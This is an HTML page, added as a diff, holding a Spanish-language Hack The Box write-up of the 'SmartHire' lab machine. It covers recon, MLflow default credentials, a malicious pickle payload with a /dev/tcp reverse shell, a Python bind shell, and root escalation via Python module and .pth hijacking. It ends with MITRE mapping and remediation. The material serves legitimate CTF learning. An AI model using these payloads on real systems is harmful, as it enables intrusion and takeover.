@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SmartHire · HTB Writeup</title>
+    <!-- Font Awesome (iconos) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <style>
+        /* ===== RESET Y BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0b0e14;
+            color: #d0d7de;
+            font-family: 'Segoe UI', 'Inter', system-ui, -apple-system, sans-serif;
+            line-height: 1.7;
+            padding: 0 1rem 3rem;
+        }
+
+        a {
+            color: #58a6ff;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        a:hover {
+            color: #79c0ff;
+        }
+
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+
+        /* ===== ENCABEZADO / NAV ===== */
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.2rem 0;
+            border-bottom: 1px solid #21262d;
+            flex-wrap: wrap;
+            gap: 0.8rem;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        .logo span {
+            color: #58a6ff;
+        }
+        .logo i {
+            color: #f0883e;
+            margin-right: 0.4rem;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 1.8rem;
+            font-size: 0.95rem;
+            flex-wrap: wrap;
+        }
+        .nav-links a {
+            color: #8b949e;
+            font-weight: 500;
+        }
+        .nav-links a:hover {
+            color: #f0f6fc;
+        }
+
+        /* ===== BANNER HERO (clic a GitHub) ===== */
+        .hero-banner {
+            margin: 2.2rem 0 2.8rem;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
+            transition: transform 0.25s ease, box-shadow 0.3s;
+            cursor: pointer;
+        }
+        .hero-banner:hover {
+            transform: scale(1.005);
+            box-shadow: 0 12px 48px rgba(88, 166, 255, 0.15);
+        }
+        .hero-banner img {
+            display: block;
+            width: 100%;
+            height: auto;
+            object-fit: cover;
+        }
+
+        /* ===== BADGES ===== */
+        .badges {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.6rem;
+            margin: 1.2rem 0 2rem;
+            justify-content: center;
+        }
+        .badge {
+            background: #161b22;
+            padding: 0.3rem 1rem;
+            border-radius: 30px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            border: 1px solid #30363d;
+            color: #c9d1d9;
+        }
+        .badge i {
+            margin-right: 0.4rem;
+        }
+        .badge.htb {
+            color: #9cf;
+        }
+        .badge.cve {
+            color: #ff7b72;
+        }
+        .badge.done {
+            color: #7ee787;
+        }
+
+        /* ===== TÍTULOS ===== */
+        h1,
+        h2,
+        h3 {
+            font-weight: 600;
+            letter-spacing: -0.3px;
+        }
+        h1 {
+            font-size: 2.6rem;
+            margin-bottom: 0.2rem;
+            background: linear-gradient(135deg, #f0f6fc 0%, #58a6ff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        h2 {
+            font-size: 2rem;
+            margin: 2.8rem 0 1.2rem;
+            border-bottom: 1px solid #21262d;
+            padding-bottom: 0.5rem;
+            color: #f0f6fc;
+        }
+        h2 i {
+            color: #58a6ff;
+            margin-right: 0.6rem;
+        }
+        h3 {
+            font-size: 1.3rem;
+            margin: 1.8rem 0 0.6rem;
+            color: #f0f6fc;
+        }
+        .subtitle {
+            font-size: 1.1rem;
+            color: #8b949e;
+            margin-top: -0.2rem;
+            margin-bottom: 1.5rem;
+        }
+
+        /* ===== TARJETAS Y BLOQUES ===== */
+        .card {
+            background: #0d1117;
+            border: 1px solid #21262d;
+            border-radius: 12px;
+            padding: 1.5rem 1.8rem;
+            margin: 1.2rem 0;
+        }
+        .card-light {
+            background: #161b22;
+        }
+
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+        }
+        @media (max-width: 700px) {
+            .grid-2 {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* ===== CÓDIGO ===== */
+        pre {
+            background: #0d1117;
+            padding: 1.2rem 1.5rem;
+            border-radius: 10px;
+            border-left: 3px solid #58a6ff;
+            overflow-x: auto;
+            font-size: 0.9rem;
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+            color: #e6edf3;
+            margin: 1rem 0;
+        }
+        code {
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+            background: #161b22;
+            padding: 0.1rem 0.4rem;
+            border-radius: 4px;
+            font-size: 0.85em;
+            color: #f0883e;
+        }
+        .bash {
+            color: #7ee787;
+        }
+        .comment {
+            color: #8b949e;
+        }
+
+        /* ===== TABLAS ===== */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.2rem 0;
+            font-size: 0.95rem;
+        }
+        th,
+        td {
+            border: 1px solid #21262d;
+            padding: 0.7rem 1rem;
+            text-align: left;
+        }
+        th {
+            background: #161b22;
+            font-weight: 600;
+            color: #f0f6fc;
+        }
+        td {
+            background: #0d1117;
+        }
+
+        /* ===== FLAGS ===== */
+        .flag-box {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.2rem;
+            justify-content: center;
+            margin: 1.5rem 0;
+        }
+        .flag-item {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 12px;
+            padding: 1rem 2rem;
+            text-align: center;
+            min-width: 180px;
+            flex: 1 1 auto;
+        }
+        .flag-item .label {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #8b949e;
+        }
+        .flag-item .hash {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1rem;
+            color: #f0883e;
+            word-break: break-all;
+            margin-top: 0.2rem;
+        }
+
+        /* ===== BOTÓN ===== */
+        .btn {
+            display: inline-block;
+            background: #21262d;
+            color: #c9d1d9;
+            padding: 0.5rem 1.4rem;
+            border-radius: 30px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            border: 1px solid #30363d;
+            transition: all 0.2s;
+        }
+        .btn:hover {
+            background: #30363d;
+            color: #f0f6fc;
+            border-color: #58a6ff;
+        }
+        .btn-primary {
+            background: #238636;
+            border-color: #238636;
+            color: #fff;
+        }
+        .btn-primary:hover {
+            background: #2ea043;
+            border-color: #2ea043;
+        }
+
+        /* ===== PIE ===== */
+        .footer {
+            margin-top: 4rem;
+            padding-top: 2rem;
+            border-top: 1px solid #21262d;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            gap: 1rem;
+            font-size: 0.9rem;
+            color: #8b949e;
+        }
+        .footer .socials {
+            display: flex;
+            gap: 1.2rem;
+        }
+        .footer .socials a {
+            color: #8b949e;
+            font-size: 1.4rem;
+            transition: color 0.2s;
+        }
+        .footer .socials a:hover {
+            color: #f0f6fc;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 2rem;
+            }
+            h2 {
+                font-size: 1.6rem;
+            }
+            .navbar {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .nav-links {
+                gap: 1rem;
+            }
+            .card {
+                padding: 1rem;
+            }
+            pre {
+                font-size: 0.8rem;
+                padding: 0.8rem 1rem;
+            }
+        }
+
+        /* ===== ANIMACIÓN SUTIL DE ENTRADA ===== */
+        .fade-in {
+            animation: fadeUp 0.6s ease forwards;
+            opacity: 0;
+        }
+        @keyframes fadeUp {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .delay-1 {
+            animation-delay: 0.1s;
+        }
+        .delay-2 {
+            animation-delay: 0.25s;
+        }
+        .delay-3 {
+            animation-delay: 0.4s;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+
+        <!-- ===== NAVBAR ===== -->
+        <nav class="navbar fade-in">
+            <div class="logo">
+                <i class="fas fa-terminal"></i> <span>Smart</span>Hire
+            </div>
+            <div class="nav-links">
+                <a href="#recon">Recon</a>
+                <a href="#initial">Exploit</a>
+                <a href="#privesc">Privesc</a>
+                <a href="#flags">Flags</a>
+                <a href="#mitre">MITRE</a>
+                <a href="#remediation">Remediation</a>
+            </div>
+        </nav>
+
+        <!-- ===== BANNER CLICKEABLE A GITHUB ===== -->
+        <a href="https://github.com/Cosm3no1de" target="_blank" class="hero-banner fade-in delay-1">
+            <img src="img3.png" alt="SmartHire - Hack The Box Writeup" />
+        </a>
+
+        <!-- ===== BADGES ===== -->
+        <div class="badges fade-in delay-1">
+            <span class="badge htb"><i class="fas fa-cube"></i> Hack The Box</span>
+            <span class="badge"><i class="fas fa-signal"></i> Medium</span>
+            <span class="badge cve"><i class="fas fa-shield-alt"></i> CVE-2024-37054</span>
+            <span class="badge done"><i class="fas fa-check-circle"></i> Completed</span>
+            <span class="badge"><i class="fas fa-lock"></i> Educational</span>
+        </div>
+
+        <!-- ===== TÍTULO PRINCIPAL ===== -->
+        <div class="fade-in delay-2">
+            <h1>SmartHire · HTB Writeup</h1>
+            <p class="subtitle">
+                <i class="fas fa-arrow-right" style="color:#58a6ff;"></i>
+                Explotación de MLflow (CVE‑2024‑37054), bind shell y escalada a root mediante hijacking de módulos Python.
+            </p>
+        </div>
+
+        <!-- ===== RESULTADOS RÁPIDOS ===== -->
+        <div class="card card-light fade-in delay-2" style="margin-top: 1.8rem;">
+            <div style="display:flex; flex-wrap:wrap; gap:1.2rem; justify-content:space-around; text-align:center;">
+                <div>
+                    <div style="font-size:0.8rem; color:#8b949e;">INITIAL ACCESS</div>
+                    <div style="font-weight:600; color:#7ee787;">svcweb</div>
+                </div>
+                <div>
+                    <div style="font-size:0.8rem; color:#8b949e;">PRIVILEGE ESCALATION</div>
+                    <div style="font-weight:600; color:#f0883e;">root</div>
+                </div>
+                <div>
+                    <div style="font-size:0.8rem; color:#8b949e;">CVE</div>
+                    <div style="font-weight:600; color:#ff7b72;">2024-37054</div>
+                </div>
+                <div>
+                    <div style="font-size:0.8rem; color:#8b949e;">TÉCNICA CLAVE</div>
+                    <div style="font-weight:600; color:#58a6ff;">.pth hijacking</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- ===== SECCIÓN: RECONOCIMIENTO ===== -->
+        <section id="recon">
+            <h2><i class="fas fa-search"></i> Reconocimiento</h2>
+
+            <h3>🖧 Escaneo de Puertos</h3>
+            <div class="card">
+                <pre><span class="bash">nmap -p- --min-rate 5000 [REDACTED_IP]</span></pre>
+                <p><strong>Resultados:</strong></p>
+                <pre>PORT   STATE SERVICE
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
+80/tcp open  http    nginx 1.18.0 (Ubuntu)</pre>
+                <pre><span class="bash">nmap -p22,80 -sCV [REDACTED_IP]</span></pre>
+                <p>El servidor HTTP redirige a <code>smarthire.htb</code>.</p>
+            </div>
+
+            <h3>🌐 Descubrimiento de Subdominios Virtuales</h3>
+            <div class="card">
+                <pre><span class="bash">ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
+      -u http://smarthire.htb \
+      -H "Host: FUZZ.smarthire.htb" \
+      -fc 301,302</span></pre>
+                <p><strong>Resultado:</strong></p>
+                <pre>models.smarthire.htb [Status: 401, Size: 137]</pre>
+                <p>El subdominio <code>models.smarthire.htb</code> responde con <code>401 Unauthorized</code> y cabecera <code>WWW-Authenticate: Basic realm="mlflow"</code>, confirmando una instancia de MLflow.</p>
+                <p><strong>Añadir a <code>/etc/hosts</code>:</strong></p>
+                <pre><span class="bash">echo "[REDACTED_IP] smarthire.htb models.smarthire.htb" | sudo tee -a /etc/hosts</span></pre>
+            </div>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- ===== SECCIÓN: ACCESO INICIAL ===== -->
+        <section id="initial">
+            <h2><i class="fas fa-bolt"></i> Acceso Inicial – CVE‑2024‑37054</h2>
+
+            <h3>🔑 Credenciales por Defecto en MLflow</h3>
+            <div class="card">
+                <pre><span class="bash">curl -s -u admin:password http://models.smarthire.htb/</span></pre>
+                <p>Las credenciales <code>admin:password</code> otorgan acceso total a la API y UI de MLflow.</p>
+                <table>
+                    <tr><th>Usuario</th><th>Contraseña</th></tr>
+                    <tr><td><code>admin</code></td><td><code>[REDACTED]</code></td></tr>
+                </table>
+            </div>
+
+            <h3>🧨 Payload Pickle Malicioso</h3>
+            <div class="card">
+                <p>MLflow almacena modelos <code>python_function</code> como archivos <strong>pickle</strong> (`.pkl`). El endpoint <code>/predict</code> deserializa el modelo mediante <code>mlflow.pyfunc.load_model()</code>.</p>
+                <p><strong>Payload (redactado):</strong></p>
+                <pre>import pickle, os
+
+class MaliciousModel:
+    def __reduce__(self):
+        cmd = "bash -c 'bash -i >& /dev/tcp/[REDACTED_IP]/4444 0>&1'"
+        return (os.system, (cmd,))</pre>
+                <p><strong>Disparar el RCE:</strong></p>
+                <pre><span class="bash">curl -X POST http://smarthire.htb/predict -F "file=@predict.csv" -b cookies.txt</span></pre>
+                <p><strong>Resultado:</strong></p>
+                <pre>$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [REDACTED_IP] from [REDACTED_TARGET] 54321
+bash-5.1$ whoami
+svcweb
+bash-5.1$ id
+uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)</pre>
+                <p>✅ <strong>Acceso inicial como <code>svcweb</code>.</strong></p>
+            </div>
+
+            <h3>🔗 Bind Shell – Bypass del Firewall de Egreso</h3>
+            <div class="card">
+                <p>El firewall de egreso bloquea las conexiones salientes. Se utilizó una <strong>bind shell</strong> (escucha en el puerto 4444 del objetivo):</p>
+                <pre>python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.bind(("0.0.0.0",4444)); s.listen(1); conn,addr=s.accept(); os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2); subprocess.call(["/bin/bash","-i"])'</pre>
+                <p>Conexión desde la máquina local:</p>
+                <pre><span class="bash">nc [REDACTED_IP] 4444</span></pre>
+            </div>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- ===== SECCIÓN: ESCALADA DE PRIVILEGIOS ===== -->
+        <section id="privesc">
+            <h2><i class="fas fa-arrow-up"></i> Escalada de Privilegios</h2>
+
+            <h3>🔍 Enumeración de Sudo</h3>
+            <div class="card">
+                <pre><span class="bash">sudo -l</span></pre>
+                <pre>User svcweb may run the following commands on smarthire:
+    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *</pre>
+                <p>El script <code>mlflowctl.py</code> se ejecuta como root sin contraseña. El comodín <code>*</code> permite pasar argumentos arbitrarios.</p>
+            </div>
+
+            <h3>🧐 Análisis de <code>mlflowctl.py</code></h3>
+            <div class="card">
+                <pre>#!/usr/bin/env python3
+import sys, site
+
+# Carga plugins desde /opt/tools/mlflow_ctl/plugins/
+site.addsitedir('/opt/tools/mlflow_ctl/plugins/dev')
+
+import mlflow_actions
+
+def main():
+    # ... llama a mlflow_actions.check_status() o mlflow_actions.restart()</pre>
+                <p>El directorio <code>dev/</code> es escribible por el grupo <code>devs</code>:</p>
+                <pre>drwxrwxr-x 2 root devs 4096 Jan  1 00:00 dev</pre>
+                <p><code>svcweb</code> pertenece a <code>devs</code>.</p>
+            </div>
+
+            <h3>🐍 Hijacking de Módulos Python mediante <code>.pth</code></h3>
+            <div class="card">
+                <p><code>site.addsitedir()</code> procesa archivos <code>.pth</code>. Cualquier línea que comience con <code>import</code> se ejecuta como código Python.</p>
+                <p><strong>Comandos de explotación (redactados):</strong></p>
+                <pre># Archivo .pth para hijack de sys.path
+echo "import sys; sys.path.insert(0, '/opt/tools/mlflow_ctl/plugins/dev')" > /opt/tools/mlflow_ctl/plugins/dev/evil.pth
+
+# Módulo malicioso
+cat > /opt/tools/mlflow_ctl/plugins/dev/mlflow_actions.py << 'EOF'
+import os
+
+def check_status():
+    os.system("chmod +s /bin/bash")
+    return "pwned"
+
+def restart():
+    os.system("chmod +s /bin/bash")
+    return "pwned"
+EOF
+
+# Ejecución como root
+sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status</pre>
+            </div>
+
+            <h3>🏴‍☠️ Shell Root</h3>
+            <div class="card">
+                <pre>bash-5.1$ bash -p
+bash-5.1# whoami
+root
+bash-5.1# cat /root/root.txt
+[REDACTED_ROOT_FLAG]</pre>
+                <p>✅ <strong>Escalada de privilegios completada. Acceso root obtenido.</strong></p>
+            </div>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- ===== SECCIÓN: FLAGS ===== -->
+        <section id="flags">
+            <h2><i class="fas fa-flag"></i> Flags Obtenidas</h2>
+            <div class="flag-box">
+                <div class="flag-item">
+                    <div class="label"><i class="fas fa-user"></i> user.txt</div>
+                    <div class="hash">[REDACTED_USER_FLAG]</div>
+                </div>
+                <div class="flag-item">
+                    <div class="label"><i class="fas fa-skull"></i> root.txt</div>
+                    <div class="hash">[REDACTED_ROOT_FLAG]</div>
+                </div>
+            </div>
+            <p style="text-align:center; color:#8b949e; font-size:0.9rem;">
+                <i class="fas fa-lock"></i> Todas las flags han sido redactadas para mantener la integridad del portafolio.
+            </p>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- ===== SECCIÓN: MITRE ATT&CK ===== -->
+        <section id="mitre">
+            <h2><i class="fas fa-sitemap"></i> MITRE ATT&amp;CK Mapping</h2>
+            <div class="card">
+                <table>
+                    <tr><th>Técnica</th><th>ID MITRE</th></tr>
+                    <tr><td>Escaneo de Servicios de Red</td><td>T1046</td></tr>
+                    <tr><td>Descubrimiento de Hosts Virtuales</td><td>T1595.003</td></tr>
+                    <tr><td>Uso de Credenciales por Defecto</td><td>T1078.001</td></tr>
+                    <tr><td>Explotación de Aplicación Expuesta</td><td>T1190</td></tr>
+                    <tr><td>Intérprete de Comandos y Scripting (Python)</td><td>T1059.006</td></tr>
+                    <tr><td>Modificación de Claves Autorizadas SSH</td><td>T1098.004</td></tr>
+                    <tr><td>Secuestro de Flujo de Ejecución (`.pth`)</td><td>T1574.001</td></tr>
+                    <tr><td>Configuración Sudo Insegura</td><td>T1548.003</td></tr>
+                    <tr><td>Abuso de Mecanismos de Control de Elevación</td><td>T1548</td></tr>
+                </table>
+            </div>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- ===== SECCIÓN: RECOMENDACIONES ===== -->
+        <section id="remediation">
+            <h2><i class="fas fa-shield-halved"></i> Recomendaciones de Mitigación</h2>
+            <div class="card">
+                <table>
+                    <tr><th>Vulnerabilidad</th><th>Mitigación</th></tr>
+                    <tr>
+                        <td><strong>CVE-2024-37054 (Deserialización Pickle)</strong></td>
+                        <td>Actualizar MLflow a versión parcheada. Usar <code>safepickle</code> o sandbox.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Credenciales por Defecto</strong></td>
+                        <td>Forzar contraseñas robustas y habilitar autenticación multifactor.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Comodín <code>*</code> en sudo</strong></td>
+                        <td>Reemplazar por reglas con argumentos explícitos en <code>/etc/sudoers</code>.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Directorios Python escribibles</strong></td>
+                        <td>Restringir permisos de escritura en <code>site-packages</code> y directorios de plugins.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Abuso de <code>.pth</code></strong></td>
+                        <td>Usar imports absolutos. Verificar integridad de módulos antes de cargarlos.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Firewall de Egreso</strong></td>
+                        <td>Implementar filtrado estricto de salida para evitar shells reversas.</td>
+                    </tr>
+                </table>
+            </div>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- ===== SECCIÓN: HERRAMIENTAS ===== -->
+        <section>
+            <h2><i class="fas fa-tools"></i> Herramientas Utilizadas</h2>
+            <div class="grid-2">
+                <div class="card"><strong>Nmap</strong> — Escaneo de puertos y detección de servicios.</div>
+                <div class="card"><strong>FFuf</strong> — Fuzzing de subdominios y directorios.</div>
+                <div class="card"><strong>Burp Suite</strong> — Intercepción y modificación de peticiones HTTP.</div>
+                <div class="card"><strong>Python</strong> — Generación de payloads y automatización del RCE.</div>
+                <div class="card"><strong>Netcat</strong> — Conexión a bind shell.</div>
+                <div class="card"><strong>Curl</strong> — Interacción con APIs y pruebas HTTP.</div>
+            </div>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- ===== PIE DE PÁGINA ===== -->
+        <footer class="footer">
+            <div>
+                <i class="fas fa-code"></i> con <i class="fas fa-heart" style="color:#f0883e;"></i> por
+                <strong><a href="https://github.com/Cosm3no1de" target="_blank">Cosm3no1de</a></strong>
+                &nbsp;·&nbsp; <span style="color:#8b949e;">Educational purposes only</span>
+            </div>
+            <div class="socials">
+                <a href="https://github.com/Cosm3no1de" target="_blank" aria-label="GitHub">
+                    <i class="fab fa-github"></i>
+                </a>
+                <a href="#" target="_blank" aria-label="LinkedIn">
+                    <i class="fab fa-linkedin-in"></i>
+                </a>
+                <a href="#" target="_blank" aria-label="Twitter">
+                    <i class="fab fa-twitter"></i>
+                </a>
+            </div>
+        </footer>
+
+        <!-- ===== CRÉDITO DE VISITAS ===== -->
+        <p style="text-align:center; margin-top:2rem; font-size:0.75rem; color:#30363d;">
+            <i class="fas fa-eye"></i> Repositorio educativo · Writeup completo
+        </p>
+
+    </div>
+    <!-- fin container -->
+</body>
+</html>
